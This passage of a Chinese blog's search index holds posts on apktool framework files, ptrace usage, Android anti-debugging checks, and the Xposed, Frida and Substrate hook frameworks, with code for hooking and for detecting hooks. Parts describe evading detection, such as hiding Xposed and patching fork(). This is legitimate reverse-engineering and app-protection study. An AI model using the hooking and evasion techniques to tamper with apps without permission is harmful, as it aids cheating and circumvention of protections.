package of id: 2. You must install proper framework files, see project website for more info. 一般来说，android应用需要使用一些设备上的资源文件，Apktool 需要 framework文件来编译apk。标准的frameworks框架文件已经嵌入在 apktool中, 所以大多数的apk不需要你再安装frameworks文件。 但是有一些厂商, 比如 HTC, 增加了他们自己的 framework文件. 为了使apktool 能够反编译上述 apps, 必须从设备中导出framework文件并且在apktool中安装/注册。 解决方法 从手机里搞出来Framework文件通常位于/system/framework/目录，少数位于/data/system-framework/，甚至有些在/system/app 或 /system/priv-app目录下，通常以”resources”, “res” 或 “framework”命名。 例如HTC的资源文件为com.htc.resources.apk, LG为lge-res.apk 使用Framework文件进行反编译123456789 $ apktool if com.htc.resources.apkI: Framework installed to: /home/brutall/apktool/framework/2.apk $ apktool d HtcContacts.apk I: Loading resource table...I: Decoding resources...I: Loading resource table from file: /home/brutall/apktool/framework/1.apkI: Loading resource table from file: /home/brutall/apktool/framework/2.apkI: Copying assets and libs... 2. 9patch文件9patch文件用于对图片进行拉伸，其左侧和上方有一条黑线，用于判断可拉伸的区域。9patch有两种表现形式： 直接的图片存在于编译APK之前的工程中，表现为图片四周有一个黑线 二进制文件android在编译成apk文件后，会把9patch信息写入到一个二进制块中叫作npTc，并且把原图片的边框去掉,直接解压缩apk看到的.9.png文件是没有黑线的 所以从apk里是反编译不出来真正的9patch图片文件的，同理重打包的时候编译器去图片里找边框黑线是找不到的。]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ptrace]]></title>
    <url>%2F2017%2F08%2F01%2Fptrace%2F</url>
    <content type="text"><![CDATA[关于ptraceptrace可以用来监控和控制一个进程的运行，获取或更改目标进程的内存和寄存器，它主要用来进行断点调试或跟踪， 参数ptrace函数体123#include &lt;sys/ptrace.h&gt;long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); enum __ptrace_request request：指示了ptrace要执行的命令。 pid_t pid: 指示ptrace要跟踪的进程。 void *addr: 指示要监控的内存地址。 void *data: 存放读取出的或者要写入的数据。 ptrace的第一个参数决定了其行为，常用到的有如下几种：12345678910111213141516PTRACE_ATTACH attach进程PTRACE_TRACEME 子进程让父进程跟踪自己PTRACE_PEEKTEXT 从内存地址中读取一个wordPTRACE_PEEKDATA 同上PTRACE_PEEKUSER 从USER区域中读取一个wordPTRACE_POKETEXT 往内存地址中写入一个wordPTRACE_POKEDATA 同上PTRACE_POKEUSER 往USER区写入一个word PTRACE_GETREGS 读取寄存器PTRACE_GETFPREGS 同上PTRACE_SETREGS 写入寄存器 PTRACE_SETFPREGS 同上 PTRACE_CONT 继续执行 可同时向子进程交付指定的信号PTRACE_SYSCALL 继续执行 进入系统调用读取参数，退出系统调用时读取返回值PTRACE_SINGLESTEP 继续执行 单步调试PTRACE_DETACH deattach ptrace检测进程被ptrace后通常会有一些特征，这些特征也常常作为反调试的判断依据： status/proc/pid/status 和 /proc/pid/task/pid/status：普通状态下，TracerPid这项应该为0；调试状态下为调试进程的PID。 stat/proc/pid/stat 和 /proc/pid/task/pid/stat：调试状态下，括号后面的第一个字母应该为t wchan/proc/pid/wchan 和 /proc/pid/task/pid/wchan：调试状态下，里面内容为ptrace_stop 实例假设目标进程如下：12345678910111213//target.c#include &lt;stdio.h&gt; int main(int argc,char* argv[])&#123; while(1) &#123; printf(&quot;Target is running:%d\n&quot;, count); count++; sleep(3); &#125; return 0;&#125; 利用ptrace操作目标进程：1234567891011121314151617181920212223242526272829303132int main(int argc, char *argv[])&#123; if(argc != 2) &#123; printf(&quot;please input pid...\n&quot;); return 1; &#125; pid_t traced_process; int status; traced_process = atoi(argv[1]); if( ptrace(PTRACE_ATTACH, traced_process, NULL, NULL) != 0) &#123; printf(&quot;Trace process failed:%d.\n&quot;, errno); return 1; &#125; while(1) &#123; wait(&amp;status); if(WIFEXITED(status)) &#123; break; &#125; tracePro(traced_process); ptrace(PTRACE_SYSCALL, traced_process, NULL, NULL); &#125; ptrace(PTRACE_DETACH, traced_process, NULL, NULL); return 0;&#125; 参考资料： ptrace http://man7.org/linux/man-pages/man2/ptrace.2.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android反调试和对抗]]></title>
    <url>%2F2017%2F06%2F13%2FAndroid%E5%8F%8D%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[反调试1.自己ptrace自己代码非常简单，在so中加上这行代码即可：1ptrace(PTRACE_TRACEME, 0, 0, 0); 其中PTRACE_TRACEME代表：本进程被其父进程所跟踪。一个进程只能被ptrace一次，通常在调试的时候都会attach被调试应用的进程，如果我们先占坑，父进程attach自己，那么其他的附加调试就会失败。 2.检测Tracerpid的值在自己的应用中的native层加上一个循环检查自己status中的TracerPid字段值，如果非0或者是非自己进程pid(如果采用了第一种方案的话，这里也是需要做一次过滤的)；那么就认为被附加调试了。 3.调试器端口检测以IDA为例，读取/proc/net/tcp，查找IDA远程调试的默认23946端口（或者执行命令netstat -apn），如果处于监听状态说明被存在调试可能。 4.调试器名称检测遍历进程，查找类似android_server，gdbserver，gdb等调试器进程 5.多进程反调试目标程序创建了多个进程，互相ptrace，不同进程分工明确，守护或者反调试。只要有一个进程出现异常，集体挂掉，颇有一番兄弟有难同当的感觉。 对抗多进程都是通过fork出来的，因此我们修改/bionic/libc/bionic/fork.c里面的fork函数来使得目标进程fork失败 6.检测系统关键文件进程被ptrace后通常会有一些特征，这些特征也常常作为反调试的判断依据： status/proc/pid/status 和 /proc/pid/task/pid/status：普通状态下，TracerPid这项应该为0；调试状态下为调试进程的PID。 stat/proc/pid/stat 和 /proc/pid/task/pid/stat：调试状态下，括号后面的第一个字母应该为t wchan/proc/pid/wchan 和 /proc/pid/task/pid/wchan：调试状态下，里面内容为ptrace_stop 7.代码执行时间检测调试状态和非调试状态代码执行时间不一样，如果两个时间值相差过大，则说明中间的代码流程被调试了。因为调试者停下来一步步观察了这一段代码的执行情况，因此这部分代码的执行时间远远超出了普通状态的执行时间。 8.使用inotify对文件系统进行监视/proc/pid/maps/proc/pid/mem/proc/pid/pagemep 防dump通过对目标进程文件/proc/pid/mem文件操作，可以获得其内存的数据。而inotify可以监控文件系统的变化，当文件被打开、删除，读写等操作时，同时用户相应变化。因此可以通过监控/proc/pid/mem 与/proc/pid/pagemep来防止内存dump。 参考资料： Android反调试技术整理与实践（https://gtoad.github.io/2017/06/25/Android-Anti-Debug/）]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android三大hook框架]]></title>
    <url>%2F2017%2F06%2F13%2FAndroid%E4%B8%89%E5%A4%A7hook%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[目前Android主流的hook框架有Xposed、Substrate和frida三种，下面一次介绍三种框架的原理和特性： XposedXposed是一个在andoid平台上比较成熟的hook框架，可以完美的在dalvik虚拟机上做到hook任意java方法 原理Android系统中所有的app进程都是有zygote进程孵化而来的，Xposed会替换/system/bin/app_process文件，app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持 运行条件 由于需要替换app_process，故需要root 重启手机后插件才会生效 使用方法 1.AndroidManifest.xml中添加Xposed 需在Application Node中添加三个Meta(xposedmodule,xposedminversion和xposeddescription)12345678910111213141516171819202122&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.example.xposedtest&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; &gt; &lt;uses-sdk android:minSdkVersion=&quot;14&quot; android:targetSdkVersion=&quot;19&quot; /&gt; &lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot; &gt; &lt;span style=&quot;color:#ff0000;&quot;&gt; &lt;!-- 以下三个为需要添加的meta--&gt; &lt;meta-data android:value=&quot;true&quot; android:name=&quot;xposedmodule&quot;/&gt; &lt;meta-data android:value=&quot;30&quot; android:name=&quot;xposedminversion&quot;/&gt; &lt;meta-data android:value=&quot;this is a test&quot; android:name=&quot;xposeddescription&quot;/&gt;&lt;/span&gt; &lt;/application&gt; &lt;/manifest&gt; assets目录下新建一个xposed_init文件 重写XC_MethodHook的两个方法beforeHookedMethod和afterHookedMethod 123456789101112131415161718192021222324252627282930313233343536373839package com.example.xposedtest;import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;import android.graphics.Color;import android.util.Log;import de.robv.android.xposed.XposedBridge;import android.widget.TextView;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;public class XposedTest implements IXposedHookLoadPackage&#123; //实现IXposedHookLoadPackage接口 public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable&#123; //判断Hook的包是否正确 if(!lpparam.packageName.equals(&quot;com.android.systemui&quot;)) &#123; XposedBridge.log(&quot;not found package&quot;); return; &#125; //找到要Hook的类名和函数，创建自己的类 findAndHookMethod(&quot;com.android.systemui.statusbar.policy.Clock&quot;,lpparam.classLoader,&quot;updateClock&quot;,new XC_MethodHook()&#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; // 这里的调用在正常函数调用之前执行，由于本例是Hook时间显示，需要在显示之后调用，所以省略 &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable&#123; // 这里的调用在正常函数调用之后执行 XposedBridge.log(&quot;aaaaaaaaaaaaaa&quot;+lpparam.packageName); TextView tv=(TextView)param.thisObject; String text=tv.getText().toString(); tv.setText(text+&quot;:)&quot;); tv.setTextColor(Color.RED); &#125; &#125;); &#125;&#125; hook检测 通过PackageManager查看安装列表，判断是否有安装Xposed Installer相关的软件包1234567PackageManager packageManager = context.getPackageManager();List applicationInfoList = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);for (ApplicationInfo applicationInfo: applicationInfoList) &#123; if (applicationInfo.packageName.equals(&quot;de.robv.android.xposed.installer&quot;)) &#123; // Xposed find &#125; &#125; 通常情况下使用Xposed Installer框架都会屏蔽对其的检测，即Hook掉PackageManager的getInstalledApplications方法的返回值，以便过滤掉de.robv.android.xposed.installer来躲避这种检测。 2.根据调用栈判断 Xposed Installer框架对每个由Zygote孵化的App进程都会介入，因此在程序方法异常栈中就会出现Xposed相关的“身影”，我们可以通过自造异常Catch来读取异常堆栈的形式，用以检查其中是否存在Xposed的调用方法。1234567try &#123; throw new Exception(&quot;blah&quot;);&#125; catch(Exception e) &#123; for (StackTraceElement stackTraceElement: e.getStackTrace()) &#123; // stackTraceElement.getClassName() stackTraceElement.getMethodName() 是否存 在Xposed &#125;&#125; 以下为使用xposed的调用栈：12345678910111213E/GEnvironment: no such table: preference (code 1): while compiling: SELECT keyguard_show_livewallpaper FROM preference...at com.meituan.test.extpackage.ExtPackageManager.checkUpdate(ExtPackageManager.java:127)at com.meituan.test.MiFGService$1.run(MiFGService.java:41)at android.os.Looper.loop(Looper.java:136)at android.app.ActivityThread.main(ActivityThread.java:5072)at java.lang.reflect.Method.invokeNative(Native Method)at java.lang.reflect.Method.invoke(Method.java:515)...at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:609)at de.robv.android.xposed.XposedBridge.main(XposedBridge.java:132) //发现Xposed模块at dalvik.system.NativeStart.main(Native Method) 读取/proc/self/maps判断无论在Java层做何种检测，Xposed都可以通过Hook相关的API并返回指定的结果来绕过检测，只要有方法就可以被Hook。如果仅在Java层检测就显得很徒劳，为了有效提搞检测准确率，就须做到Java和Native层同时检测。 在Native层读取/proc/self/maps文件，判断App自身加载的库中是否存在XposedBridge.jar、相关的Dex、Jar和So库等文件123456789101112131415161718192021bool is_xposed()&#123; bool rel = false; FILE *fp = NULL; char* filepath = &quot;/proc/self/maps&quot;; ... string xp_name = &quot;XposedBridge.jar&quot;; fp = fopen(filepath,&quot;r&quot;)) while (!feof(fp)) &#123; fgets(strLine,BUFFER_SIZE,fp); origin_str = strLine; str = trim(origin_str); if (contain(str,xp_name)) &#123; rel = true; //检测到Xposed模块 break; &#125; &#125; ...&#125; Frida本节介绍的是frida框架，frida这个HOOK框架主要使用Python和javascript脚本编写，所以兼容性和移植性都很好，可以适用于多种平台，最重要的是不用每次都重启手机。官网：http://www.frida.re/ hook对抗 遍历进程，判断frida-server是否运行 123456789101112131415public boolean checkRunningProcesses() &#123; boolean returnValue = false; // Get currently running application processes List&lt;RunningServiceInfo&gt; list = manager.getRunningServices(300); if(list != null)&#123; String tempName; for(int i=0;i&lt;list.size();++i)&#123; tempName = list.get(i).process; if(tempName.contains(&quot;fridaserver&quot;)) &#123; returnValue = true; &#125; &#125; &#125; return returnValue;&#125; fridaserver 默认的 TCP 端口是 27047，可以检查这个端口是否开放 1234567891011boolean is_frida_server_listening() &#123; struct sockaddr_in sa; memset(&amp;sa, 0, sizeof(sa)); sa.sin_family = AF_INET; sa.sin_port = htons(27047); inet_aton(&quot;127.0.0.1&quot;, &amp;(sa.sin_addr)); int sock = socket(AF_INET , SOCK_STREAM , 0); if (connect(sock , (struct sockaddr*)&amp;sa , sizeof sa) != -1) &#123; /* Frida server detected. Do something… */ &#125;&#125; 每个开放的端口发送 D-Bus 的认证消息，哪个端口回复了哪个就是 fridaserver 123456789101112131415161718for(i = 0 ; i &lt;= 65535 ; i++) &#123; sock = socket(AF_INET , SOCK_STREAM , 0); sa.sin_port = htons(i); if (connect(sock , (struct sockaddr*)&amp;sa , sizeof sa) != -1) &#123; __android_log_print(ANDROID_LOG_VERBOSE, APPNAME, &quot;FRIDA DETECTION [1]: Open Port: %d&quot;, i); memset(res, 0 , 7); // send a D-Bus AUTH message. Expected answer is “REJECT&quot; send(sock, &quot;\x00&quot;, 1, NULL); send(sock, &quot;AUTH\r\n&quot;, 6, NULL); usleep(100); if (ret = recv(sock, res, 6, MSG_DONTWAIT) != -1) &#123; if (strcmp(res, &quot;REJECT&quot;) == 0) &#123; /* Frida server detected. Do something… */ &#125; &#125; &#125; close(sock);&#125; 内存特征码检测在内存中扫描 frida 的库特征 “gadgets”。例如字符串 “LIBFRIDA”在所有 frida-gadget 和 frida-agent 的版本中都有出现。 1234567891011121314151617181920212223static char keyword[] = &quot;LIBFRIDA&quot;;num_found = 0;int scan_executable_segments(char * map) &#123; char buf[512]; unsigned long start, end; sscanf(map, &quot;%lx-%lx %s&quot;, &amp;start, &amp;end, buf); if (buf[2] == &apos;x&apos;) &#123; return (find_mem_string(start, end, (char*)keyword, 8) == 1); &#125; else &#123; return 0; &#125;&#125;void scan() &#123; if ((fd = my_openat(AT_FDCWD, &quot;/proc/self/maps&quot;, O_RDONLY, 0)) &gt;= 0) &#123; while ((read_one_line(fd, map, MAX_LINE)) &gt; 0) &#123; if (scan_executable_segments(map) == 1) &#123; num_found++; &#125; &#125; if (num_found &gt; 1) &#123; /* Frida Detected */ &#125;&#125; SubstrateSubstrate适用于对native层的hook, hook对抗 读取/proc/self/maps libsubstrate.so和libsubstrate-dvm.so两个文件为Substrate必载入的文件，当进程maps表中出现libsubstrate-dvm.so，可以尝试去load该so文件并调用MSJavaHookMethod方法，它会返回该方法的地址即判定为恶意模块（第三方程序）。12345678910void* lookup_symbol(char* libraryname,char* symbolname) &#123; void *imagehandle = dlopen(libraryname, RTLD_GLOBAL | RTLD_NOW); if (imagehandle != NULL)&#123; void * sym = dlsym(imagehandle, symbolname); if (sym != NULL)&#123; return sym; //发现Cydia Substrate相关模块 &#125; ...&#125; 基于特征码的检测 参考资料： http://www.520monkey.com/archives/1028 Native层的Hook神器Cydia Substrate使用详解]]></content>
  </entry>
</search>
